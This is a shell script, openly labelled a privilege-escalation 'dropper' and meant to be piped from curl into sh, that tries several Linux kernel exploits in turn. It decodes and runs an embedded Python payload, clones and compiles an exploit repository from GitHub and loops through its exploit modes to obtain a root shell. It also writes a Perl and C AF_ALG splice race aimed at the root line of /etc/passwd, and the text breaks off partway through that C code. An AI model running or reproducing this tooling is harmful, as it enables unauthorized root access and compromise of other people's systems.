#!/bin/sh
# CopyFail + DIRTYFAIL Polyglot Dropper v1.0
# Usage: curl -sSL URL | sh
# Detects available runtimes and deploys appropriate privilege escalation payload
# Methods: Python3 (full CopyFail Combo v3.0), C (DIRTYFAIL from source), Perl, Bash+C
set -e

WORKDIR="/tmp/.df_$(id -u)_$$"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

log() { printf '\033[1;35m[*]\033[0m %s\n' "$1"; }
ok()  { printf '\033[1;32m[+]\033[0m %s\n' "$1"; }
err() { printf '\033[1;31m[-]\033[0m %s\n' "$1"; }
warn(){ printf '\033[1;33m[!]\033[0m %s\n' "$1"; }

cleanup_workdir() {
    rm -rf "$WORKDIR" 2>/dev/null || true
}

HAS_PYTHON3=0; HAS_PERL=0; HAS_GCC=0; HAS_BASH=0; HAS_GIT=0; HAS_CURL=0; HAS_WGET=0

check_tools() {
    command -v python3 >/dev/null 2>&1 && HAS_PYTHON3=1
    command -v perl    >/dev/null 2>&1 && HAS_PERL=1
    (command -v gcc >/dev/null 2>&1 || command -v cc >/dev/null 2>&1) && HAS_GCC=1
    command -v bash    >/dev/null 2>&1 && HAS_BASH=1
    command -v git     >/dev/null 2>&1 && HAS_GIT=1
    command -v curl    >/dev/null 2>&1 && HAS_CURL=1
    command -v wget    >/dev/null 2>&1 && HAS_WGET=1

    log "Runtime detection:"
    [ "$HAS_PYTHON3" = "1" ] && ok "  python3: $(python3 --version 2>&1)" || warn "  python3: not found"
    [ "$HAS_PERL" = "1" ]    && ok "  perl:    $(perl -v 2>&1 | grep -o 'v[0-9.]*' | head -1)" || warn "  perl: not found"
    [ "$HAS_GCC" = "1" ]     && ok "  gcc/cc:  available" || warn "  gcc/cc: not found"
    [ "$HAS_BASH" = "1" ]    && ok "  bash:    $(bash --version 2>&1 | head -1 | grep -o '[0-9][0-9.]*' | head -1)" || warn "  bash: not found"
    [ "$HAS_GIT" = "1" ]     && ok "  git:     available" || warn "  git: not found"
}

fetch_url() {
    _url="$1"; _out="$2"
    if [ "$HAS_CURL" = "1" ]; then
        curl -sSL "$_url" -o "$_out" 2>/dev/null
    elif [ "$HAS_WGET" = "1" ]; then
        wget -q "$_url" -O "$_out" 2>/dev/null
    else
        err "No curl or wget available"
        return 1
    fi
}

RESULT_PYTHON=255
RESULT_C=255
RESULT_PERL=255

# ============================================================
# METHOD 1: Python3 — Full CopyFail Combo v3.0
# Contains: CopyFail passwd flip, binary mutation, DirtyFrag auto-chain, Pack2TheRoot
# ============================================================
run_python() {
    log "=== METHOD: Python3 CopyFail Combo v3.0 ==="
    PYBLOB=$(cat <<'PYEOF'

PYEOF
)
    echo "$PYBLOB" | base64 -d | gunzip > "$WORKDIR/copyfail_combo.py"
    chmod +x "$WORKDIR/copyfail_combo.py"
    log "Executing CopyFail Combo (4 methods: passwd flip, binary mutation, dirtyfrag, pack2root)..."
    python3 "$WORKDIR/copyfail_combo.py" --auto --deploy-gs || true
    RESULT_PYTHON=$?
    if [ "$RESULT_PYTHON" = "0" ]; then
        ok "Python3 CopyFail Combo: SUCCESS (root obtained)"
    else
        warn "Python3 CopyFail Combo: exited with code $RESULT_PYTHON"
    fi
    return $RESULT_PYTHON
}

# ============================================================
# METHOD 2: C Compilation — DIRTYFAIL from GitHub source
# Contains: CVE-2026-31431, CVE-2026-43284, CVE-2026-43500 + exploit-su
# ============================================================
run_c_compile() {
    log "=== METHOD: C (DIRTYFAIL compile from source) ==="

    DFDIR="$WORKDIR/dirtyfail"

    if [ "$HAS_GIT" = "1" ]; then
        log "Cloning DIRTYFAIL repo..."
        git clone --depth=1 https://github.com/KaraZajac/DIRTYFAIL.git "$DFDIR" 2>/dev/null
    else
        log "Downloading DIRTYFAIL source archive..."
        mkdir -p "$DFDIR"
        fetch_url "https://github.com/KaraZajac/DIRTYFAIL/archive/refs/heads/main.tar.gz" "$WORKDIR/df.tar.gz"
        tar xzf "$WORKDIR/df.tar.gz" -C "$DFDIR" --strip-components=1
    fi

    if [ ! -f "$DFDIR/Makefile" ] && [ ! -f "$DFDIR/src/Makefile" ]; then
        err "DIRTYFAIL source structure not found"
        return 1
    fi

    log "Compiling DIRTYFAIL..."
    CC_BIN="gcc"
    command -v gcc >/dev/null 2>&1 || CC_BIN="cc"

    if [ -f "$DFDIR/Makefile" ]; then
        cd "$DFDIR"
        make CC="$CC_BIN" -j$(nproc 2>/dev/null || echo 2) 2>/dev/null || {
            warn "Make failed, trying manual compilation..."
            cd "$DFDIR/src" 2>/dev/null || cd "$DFDIR"
            $CC_BIN -O2 -D_GNU_SOURCE -o "$WORKDIR/dirtyfail" \
                *.c -lpthread 2>/dev/null || {
                err "Compilation failed"
                cd "$WORKDIR"
                return 1
            }
        }
        [ -f "$DFDIR/dirtyfail" ] && cp "$DFDIR/dirtyfail" "$WORKDIR/dirtyfail"
        [ -f "$DFDIR/build/dirtyfail" ] && cp "$DFDIR/build/dirtyfail" "$WORKDIR/dirtyfail"
        cd "$WORKDIR"
    elif [ -d "$DFDIR/src" ]; then
        cd "$DFDIR/src"
        $CC_BIN -O2 -D_GNU_SOURCE -o "$WORKDIR/dirtyfail" \
            *.c -lpthread 2>/dev/null || {
            err "Compilation failed"
            cd "$WORKDIR"
            return 1
        }
        cd "$WORKDIR"
    fi

    if [ ! -f "$WORKDIR/dirtyfail" ]; then
        err "DIRTYFAIL binary not produced"
        return 1
    fi

    chmod +x "$WORKDIR/dirtyfail"
    ok "DIRTYFAIL compiled successfully"

    log "Running scan first..."
    "$WORKDIR/dirtyfail" --scan --no-color 2>&1 | tail -10

    log "Attempting exploit chain (copyfail → esp → rxrpc → su)..."
    for method in exploit-copyfail exploit-esp exploit-esp6 exploit-rxrpc exploit-gcm exploit-su; do
        log "  Trying --$method..."
        "$WORKDIR/dirtyfail" --$method --no-shell --no-color 2>&1 | tail -3
        rc=$?
        if [ "$rc" = "5" ] || [ "$rc" = "0" ]; then
            ok "DIRTYFAIL --$method: SUCCESS"
            RESULT_C=0
            # Now run with shell
            "$WORKDIR/dirtyfail" --$method --no-color
            return 0
        fi
    done

    warn "All DIRTYFAIL exploit modes failed"
    RESULT_C=1
    return 1
}

# ============================================================
# METHOD 3: Perl — AF_ALG CopyFail splice primitive
# Minimal port: CVE-2026-31431 passwd UID flip only
# ============================================================
run_perl() {
    log "=== METHOD: Perl (AF_ALG CopyFail splice) ==="
    cat > "$WORKDIR/copyfail.pl" << 'PERLEOF'
#!/usr/bin/perl
use strict;
use warnings;
use POSIX qw(getuid);
use Socket;
use Fcntl qw(:flock O_RDONLY);

my $AF_ALG = 38;
my $SOL_ALG = 279;
my $ALG_SET_KEY = 1;
my $ALG_SET_AEAD_AUTHSIZE = 4;
my $SPLICE_F_NONBLOCK = 2;

sub log_msg { print "\033[1;35m[*]\033[0m $_[0]\n"; }
sub log_ok  { print "\033[1;32m[+]\033[0m $_[0]\n"; }
sub log_err { print "\033[1;31m[-]\033[0m $_[0]\n"; }

my $uid = getuid();
if ($uid == 0) { log_ok("Already root!"); exec("/bin/sh"); }

log_msg("CopyFail Perl — CVE-2026-31431 AF_ALG splice UID flip");
log_msg("Current UID: $uid");

my $kernel = `uname -r`; chomp $kernel;
log_msg("Kernel: $kernel");

# Check algif_aead module
my $algo_found = 0;
if (open(my $fh, '<', '/proc/crypto')) {
    while (<$fh>) {
        if (/authenc\(/) { $algo_found = 1; last; }
    }
    close $fh;
}
unless ($algo_found) {
    log_msg("Loading algif_aead...");
    system("modprobe algif_aead 2>/dev/null");
    system("modprobe authenc 2>/dev/null");
}

# Read /etc/passwd to find our line
open(my $pw, '<', '/etc/passwd') or die "Cannot read /etc/passwd: $!";
my @lines = <$pw>;
close $pw;

my $target_line = '';
my $target_offset = 0;
my $offset = 0;
for my $line (@lines) {
    if ($line =~ /^root:/) {
        $target_line = $line;
        $target_offset = $offset;
        last;
    }
    $offset += length($line);
}

unless ($target_line) { log_err("Cannot find root line in /etc/passwd"); exit 1; }

# Find the UID field (3rd field, colon-separated)
# root:x:0:0:root:/root:/bin/bash
my @fields = split(/:/, $target_line);
my $uid_field_offset = length($fields[0]) + 1 + length($fields[1]) + 1; # "root:x:"
log_msg("Root UID at passwd offset: " . ($target_offset + $uid_field_offset));

# Create AF_ALG socket
my $alg_type = "aead";
my $alg_name = "authenc(hmac(sha256),cbc(aes))";

# Pack sockaddr_alg: family(2) + type(14) + feat_mask(4) + mask(4) + name(64)
my $sa = pack("S", $AF_ALG);
$sa .= pack("a14", $alg_type);
$sa .= pack("NN", 0, 0);  # feat_mask, mask
$sa .= pack("a64", $alg_name);

socket(my $algfd, $AF_ALG, Socket::SOCK_SEQPACKET(), 0) or do {
    log_err("Cannot create AF_ALG socket: $! (algif_aead not available?)");
    exit 1;
};

bind($algfd, $sa) or do {
    log_err("AF_ALG bind failed: $! (algorithm not available?)");
    exit 1;
};

# Set key (32 bytes for aes-256)
my $key = pack("NN", 20, 32) . ("\x41" x 20) . ("\x42" x 32);
setsockopt($algfd, $SOL_ALG, $ALG_SET_KEY, $key) or do {
    log_err("ALG_SET_KEY failed: $!");
    exit 1;
};

# Set auth size
setsockopt($algfd, $SOL_ALG, $ALG_SET_AEAD_AUTHSIZE, pack("I", 20)) or do {
    log_err("ALG_SET_AEAD_AUTHSIZE failed: $!");
    exit 1;
};

log_msg("AF_ALG socket configured, attempting splice race...");
log_msg("This may take 30-120 seconds...");

# The actual splice race needs to be done via syscall which is complex in pure Perl
# Fork a child to do the race via inline C if possible, or use Inline::C
eval {
    require Inline;
    Inline->import(C => 'DATA');
};
if ($@) {
    log_err("Perl Inline::C not available — splice race requires native code");
    log_msg("Falling back to system() with C snippet compilation...");

    # Write minimal C race code and compile
    my $c_code = <<'CCODE';
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <sys/sendfile.h>
#include <pthread.h>
#include <sys/mman.h>

#ifndef AF_ALG
#define AF_ALG 38
#endif
#ifndef SOL_ALG
#define SOL_ALG 279
#endif

static volatile int race_go = 0;
static int alg_op_fd = -1;
static int pipe_fds[2];
static off_t target_off;
static size_t target_len;

void *racer(void *arg) {
    int passwd_fd = open("/etc/passwd", O_RDONLY);
    if (passwd_fd < 0) return NULL;
    while (!race_go) usleep(100);
    for (int i = 0; i < 50000; i++) {
        lseek(passwd_fd, 0, SEEK_SET);
        splice(passwd_fd, &target_off, pipe_fds[1], NULL, target_len, SPLICE_F_NONBLOCK);
    }
